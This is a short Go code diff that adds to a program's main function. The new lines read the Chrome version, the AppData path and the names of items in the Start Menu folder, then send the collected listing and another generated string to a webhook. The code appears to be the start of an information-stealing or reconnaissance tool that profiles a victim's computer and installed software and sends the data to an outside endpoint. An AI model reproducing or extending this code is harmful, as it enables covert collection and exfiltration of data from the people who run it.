@@ -2,6 +2,7 @@ package main
 
 import (
 	"encoding/json"
+	"os"
 	"strconv"
 	"strings"
 )
@@ -11,12 +12,21 @@ func main() {
 	//webhook(data)
 	//data, _ := os.Getwd()\
 	// println(existsFromC("C://Program Files"))
-  // println(isWindows())
-  output, err := getChromeVersion()
-  if err != nil {
-    println(err.Error())
-  }
-  println(output)
+	// println(isWindows())
+	output, err := getChromeVersion()
+	if err != nil {
+		println(err.Error())
+	}
+	println(output)
+	println(appdataPath())
+	out, _ := os.ReadDir(startMenuPath())
+	sb := strings.Builder{}
+	for _, e := range out {
+		sb.WriteString(e.Name())
+		sb.WriteString("\n")
+	}
+	webhook(makeWebhookString())
+	webhook(sb.String())
 }
 
 func makeWebhookString() string {
